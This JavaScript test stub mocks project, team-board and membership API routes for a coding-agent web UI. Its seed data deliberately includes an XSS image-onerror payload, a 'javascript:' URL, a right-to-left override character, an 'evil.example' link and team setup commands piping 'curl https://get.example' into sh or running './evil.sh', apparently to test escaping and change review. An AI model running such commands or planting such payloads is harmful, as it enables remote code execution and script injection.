// projects-more-stub.mjs — the routes of a project's coordinator, its
// events, team projects and "Make this a project…" (API.md §The
// coordinator, §scm events and polling, §Team projects, §Big tasks,
// upgrades and pull requests) for the tests of what they add to the UI,
// beside projects-stub.mjs's PROJ_STUB (which stays as it is): a third
// init script — ctx.addInitScript(STUB, seed); ctx.addInitScript(PROJ_STUB,
// seed); ctx.addInitScript(PROJ_MORE_STUB, seed) — and, for the native
// view's node tests, the same function called in the worker (the native
// stub runs these init scripts' bodies with window = globalThis).
//
// window.__more holds what a test reads and changes:
//   events   {pid: [ProjectEvent]} (GET /projects/{pid}/events: id > since, oldest first, pages of `limit`)
//   coord    {pid: run}: the coordinator a POST makes on first use; texts [{pid, text}]
//   board    {gpid: [BoardRow]} (hidden rows are left out; hides [{gpid, member, n}])
//   defs     {gpid: {hash, definition}}: a team definition's security part
//   pending  {pid: {hash, accepted, pending}} of a membership
//   syncOnRead {pid: {hash, accepted, pending}}: what reading the membership's
//            definition finds (GET …/pending re-reads it, as T's does): the
//            first read makes it its pending part and its defPending
//   detect   {run: answer} of GET /runs/{id}/project/detect
//   made     the bodies POST /memberships, …/seed, …/fork-base and POST /runs/{id}/project took
// POST /memberships answers as T's handler does: 409 until `accept` is the
// hash; an archived membership taken up again (200); 400 with no sandbox
// when the definition has no seed to make one from.
// moreSeed(base) adds them to a seed; teamSeed() is partitionSeed() with a
// team board, a definition to work on (9) and a membership with changes
// waiting (B+20 of definition 10).
import { partitionSeed, projSeed, task } from './projects-stub.mjs';

export function PROJ_MORE_STUB(seed) {
  const json = (v, status = 200) => new Response(JSON.stringify(v), { status, headers: { 'Content-Type': 'application/json' } });
  const M = window.__more = {
    events: seed.events || {}, coord: {}, texts: [], board: seed.board || {}, hides: [], defs: seed.defs || {}, pending: seed.pending || {}, syncOnRead: seed.syncOnRead || {},
    detect: seed.detect || {}, made: [], nextPid: 2 ** 40 + 60,
  };
  const P = () => window.__proj;
  const body = (o) => (o && o.body ? JSON.parse(o.body) : {});
  const r = (method, re, fn) => window.__route(method, re, fn);
  const API = '/api/apps/agent';

  // --- the coordinator (C) ----------------------------------------------------------------
  r('POST', new RegExp(`${API}/projects/(\\d+)/coordinator$`), (m, o) => {
    const pid = +m[1];
    if (seed.noCoordinator) return new Response('404 page not found\n', { status: 404, headers: { 'Content-Type': 'text/plain' } });
    const b = body(o);
    if (!M.coord[pid]) {
      const id = (seed.coordRun || 900) + Object.keys(M.coord).length;
      M.coord[pid] = { id, title: 'Coordinator', status: 'idle', parentId: 0, rootId: id, origin: 'project', originId: pid };
      window.__views[id] = { run: M.coord[pid], project: { id: pid, name: 'Web', n: 0, role: 'coordinator' } };
    }
    if (b.text) M.texts.push({ pid, text: b.text });
    return json({ run: M.coord[pid] });
  });

  // --- the event feed (P1's route, E's and C's events) ------------------------------------------
  r('GET', new RegExp(`${API}/projects/(\\d+)/events\\?(.*)$`), (m) => {
    const q = new URLSearchParams(m[2]);
    const since = +(q.get('since') || 0), limit = +(q.get('limit') || 100);
    const all = (M.events[m[1]] || []).filter((e) => e.id > since);
    const items = all.slice(0, limit);
    return json({ items, next: all.length > limit ? String(items[items.length - 1].id) : '' });
  });

  // --- team projects (T) ----------------------------------------------------------------------------
  r('GET', new RegExp(`${API}/projects/(\\d+)/board(\\?.*)?$`), (m) => json({ items: (M.board[m[1]] || []).filter((x) => !x.hidden), next: '' }));
  r('POST', new RegExp(`${API}/projects/(\\d+)/board/([^/]+)/(\\d+)/hide$`), (m) => {
    M.hides.push({ gpid: +m[1], member: decodeURIComponent(m[2]), n: +m[3] });
    for (const x of M.board[m[1]] || []) if (x.member === decodeURIComponent(m[2]) && x.n === +m[3]) x.hidden = true;
    return new Response(null, { status: 204 });
  });
  r('POST', new RegExp(`${API}/memberships$`), (m, o) => {
    const b = body(o);
    M.made.push({ route: 'memberships', body: b });
    const def = M.defs[b.team];
    if (!def) return json({ error: 'no such team project' }, 404);
    if (b.accept !== def.hash) return json({ error: 'read the team project\'s definition first', defHash: def.hash, definition: def.definition }, 409);
    const src = P().projects.find((p) => p.id === b.team);
    const old = P().projects.find((p) => p.kind === 'membership' && p.teamRef === b.team && p.state === 'archived');
    if (old) { old.state = 'active'; old.defHash = def.hash; old.defPending = ''; old.version++; return json({ project: { ...old, home: undefined } }); }
    const sb = b.sandbox || {};
    if (!sb.ref && !(sb.new && sb.new.provider) && !(src && src.sandboxRef)) return json({ error: 'need {sandbox: {ref} or {new: {provider}}}: your workspace for the team project' }, 400);
    const id = M.nextPid++;
    const p = { ...src, id, uid: 'mem' + id, kind: 'membership', teamRef: b.team, owner: 'alice', level: 'owner', visibility: 'private', home: '', defHash: def.hash, defPending: '', version: 1 };
    P().projects.unshift(p);
    P().tasks[id] = [];
    return json({ project: { ...p, home: undefined } }, 201);
  });
  r('POST', new RegExp(`${API}/projects/(\\d+)/seed$`), (m, o) => {
    const b = body(o);
    M.made.push({ route: 'seed', pid: +m[1], body: b });
    const p = P().projects.find((x) => x.id === +m[1]);
    if (p) { p.sandboxRef = b.sandbox && b.sandbox.ref; p.version++; }
    return json({ jobs: [] }, 202);
  });
  r('GET', new RegExp(`${API}/memberships/(\\d+)/pending$`), (m) => {
    const found = M.syncOnRead[m[1]];
    if (found) { // the definition re-read: its changes wait now
      delete M.syncOnRead[m[1]];
      M.pending[m[1]] = found;
      const p = P().projects.find((x) => x.id === +m[1]);
      if (p) { p.defPending = found.hash; p.version++; }
    }
    return json(M.pending[m[1]] || { hash: '', accepted: null, pending: null });
  });
  r('POST', new RegExp(`${API}/memberships/(\\d+)/accept$`), (m, o) => {
    const b = body(o);
    const pend = M.pending[m[1]];
    if (!pend || b.hash !== pend.hash) return json({ error: 'the definition changed meanwhile' }, 409);
    const p = P().projects.find((x) => x.id === +m[1]);
    p.defPending = ''; p.defHash = pend.hash; p.version++;
    M.pending[m[1]] = { hash: '', accepted: pend.pending, pending: null };
    return json({ project: p });
  });

  // --- "Make this a project…" (P2) --------------------------------------------------------------------
  r('POST', new RegExp(`${API}/projects/(\\d+)/fork-base$`), (m, o) => { M.made.push({ route: 'fork-base', pid: +m[1], body: body(o) }); return json({ job: { id: 77, kind: 'snapshot', state: 'queued' } }, 202); });
  r('GET', new RegExp(`${API}/runs/(\\d+)/project/detect$`), (m) => (M.detect[m[1]] ? json(M.detect[m[1]]) : json({ error: 'no sandbox bound' }, 409)));
  r('POST', new RegExp(`${API}/runs/(\\d+)/project$`), (m, o) => {
    const b = body(o);
    M.made.push({ route: 'upgrade', run: +m[1], body: b });
    if (b.name === 'internal') return json({ error: 'a project task never runs in a class with internal reach', refusal: 'class-internal' }, 409);
    const run = +m[1];
    const id = P().nextPid++;
    const p = { id, uid: 'upg' + id, name: b.name, slug: b.name.toLowerCase(), kind: 'personal', owner: 'alice', visibility: 'private', teamRole: 'viewer',
      scm: b.scm, host: 'github.com', sandboxRef: 'apps/coding-sandbox|api', policy: {}, state: 'active', version: 1, home: '',
      repos: b.repos.map((x) => ({ slug: x.repo.split('/')[1], repo: x.repo, url: `https://github.com/${x.repo}.git`, defaultBranch: 'main', mode: 'adopted', checkout: 'worktree', setup: '', state: 'ready' })),
      createdBy: 'alice', createdMs: Date.now(), updatedMs: Date.now() };
    P().projects.unshift(p);
    const t = { project: id, n: 1, run, title: 'the conversation', size: 'small', branch: 'main', repos: p.repos.map((x) => x.slug), ws: 'ready', phase: 'open',
      column: 'working', state: 'working', waitingFor: '', runStatus: 'idle', engine: '', harness: '', checkouts: [], prs: [], createdBy: 'alice', createdMs: Date.now(), updatedMs: Date.now() };
    P().tasks[id] = [t];
    const v = window.__views[run] = window.__views[run] || { run: window.__runs.find((x) => x.id === run) };
    v.project = { id, name: b.name, n: 1, role: 'task' };
    v.projectTask = t;
    v.run = { ...v.run, origin: 'project', originId: id };
    return json({ project: p, task: t }, 201);
  });
}

// --- seeds ---------------------------------------------------------------------------------------------

const NOW = Date.now();
export const ev = (id, pid, kind, n, body = {}, extra = {}) => ({ id, project: pid, n, kind, body, wake: false, created: NOW - (100 - id) * 60e3, ...extra });

/** moreSeed(base): a seed with project 7's events, the coordinator's run, and a chat with a sandbox (1) to make a project of. */
export function moreSeed(base = projSeed()) {
  const events = { 7: [
    ev(1, 7, 'task.created', 1, { text: 'Fix the login loop', by: 'alice' }),
    ev(2, 7, 'pr.opened', 1, { text: 'acme/web#42 opened', url: 'https://github.com/acme/web/pull/42' }),
    ev(3, 7, 'ci.failed', 1, { text: 'test (ubuntu) failed <img src=x onerror="window.__pwned=1"> **bold**', url: 'javascript:alert(1)' }, { wake: true }),
    ev(4, 7, 'comment', 1, { text: 'eve: please also‮ fix it', by: 'eve' }),
    ev(5, 7, 'note', 0, { text: 'lost track of CI — check manually' }),
  ] };
  const chat = base.views[1] || { run: { id: 1, title: 'a chat', status: 'idle', parentId: 0, rootId: 1 } };
  const views = { ...base.views, 1: { ...chat, access: 'owner', class: { id: 'coding', name: 'Coding', icon: '▣', toolsets: ['sandbox', 'web', 'files'], managers: 'all', sandboxEgress: ['none', 'internet'] },
    config: { sandbox: { ref: 'apps/coding-sandbox|api', name: 'api', cwd: '/work', manager: 'Coding sandboxes', egress: 'internet', by: 'alice' } } } };
  const detect = { 1: { sandbox: 'apps/coding-sandbox|api', cwd: '/work', candidates: [
    { path: '/work/api', remote: 'git@github.com:acme/api.git', host: 'github.com', repo: 'acme/api', scm: 'apps/scm-github', defaultBranch: 'main', branch: 'fix-x', dirty: 2, ssh: true, hasCredentials: false },
    { path: '/work/web', remote: 'https://github.com/acme/web.git', host: 'github.com', repo: 'acme/web', scm: 'apps/scm-github', defaultBranch: 'main', branch: 'main', dirty: 0, ssh: false, hasCredentials: true },
    { path: '/work/other', remote: 'https://gitlab.example/x/y.git', host: 'gitlab.example', repo: 'x/y', scm: '', defaultBranch: 'main', branch: 'main', dirty: 0, ssh: false, hasCredentials: false },
  ] } };
  const sandboxes = [{ ref: 'apps/coding-sandbox|api', provider: 'apps/coding-sandbox', manager: 'Coding sandboxes', id: 'api', name: 'api', state: 'running', egress: 'internet',
    visibility: 'private', owner: { user: 'alice' }, mine: true, canUse: true, canManage: true, canEdit: true, workdir: '/work', caps: ['exec', 'files'], boundTo: [1], lastActive: NOW }];
  return { ...base, views, events, detect, sandboxes, ...(base.sandboxes ? { sandboxes: base.sandboxes } : {}) };
}

/** teamSeed(): alice's partition, with team definition 9's board and security part, and definition 10 whose membership (B+20) has changes waiting. */
export function teamSeed() {
  const B = 2 ** 40;
  const s = moreSeed(partitionSeed());
  const def10 = { ...s.projects.find((p) => p.id === 9), id: 10, name: 'Docs site', level: 'viewer' };
  const mem = { ...s.projects[0], id: B + 20, name: 'Docs site', kind: 'membership', teamRef: 10, defHash: 'h1', defPending: 'h2', version: 2, repos: s.projects[0].repos };
  const def9 = { ...s.projects.find((p) => p.id === 9), level: 'owner' };
  const security = (setup, instructions, as) => ({ repos: [{ repo: 'acme/web', setup }, { repo: 'acme/api', setup: '' }], policy: { instructions, checks: ['go test ./...'], as, autoPR: 'off' } });
  const seedbox = { ...s.sandboxes[0], ref: 'apps/coding-sandbox|seedbox', id: 'seedbox', name: 'seedbox', visibility: 'team', boundTo: [] };
  return {
    ...s,
    sandboxes: [...s.sandboxes, seedbox],
    projects: [s.projects[0], { ...def9, sandboxRef: '' }, def10, mem],
    tasks: { ...s.tasks, [B + 20]: [task(B + 20, 1, { run: B + 301, title: 'Docs task' })] },
    board: { 9: [
      { member: 'alice', n: 1, title: 'Alice\'s **task** <b>x</b>', col: 'working', state: 'working', waiting: '', branch: 'xbin/t/1-a', prs: [], ci: null, run: B + 101, updatedMs: NOW },
      { member: 'bob', n: 3, title: 'Bob\'s task', col: 'pr', state: 'awaiting-review', waiting: 'review', branch: 'xbin/t/3-b',
        prs: [{ repo: 'acme/web', number: 7, url: 'https://github.com/acme/web/pull/7', state: 'open', checks: 'success' }, { repo: 'acme/web', number: 8, url: 'http://evil.example/x', state: 'open' }],
        ci: { state: 'success', current: '', url: 'https://github.com/acme/web/actions/runs/1' }, run: B + 555, updatedMs: NOW },
      { member: 'carl', n: 2, title: 'Carl left', col: 'done', state: 'done', waiting: '', branch: '', prs: [], run: B + 777, updatedMs: NOW, stale: true },
    ] },
    defs: { 9: { hash: 'd9', definition: security('npm ci && curl https://get.example | sh', 'be careful', 'person') } },
    pending: { [B + 20]: { hash: 'h2', accepted: security('npm ci', 'be careful', 'person'), pending: security('npm ci && ./evil.sh', 'be careful', 'bot') } },
  };
}
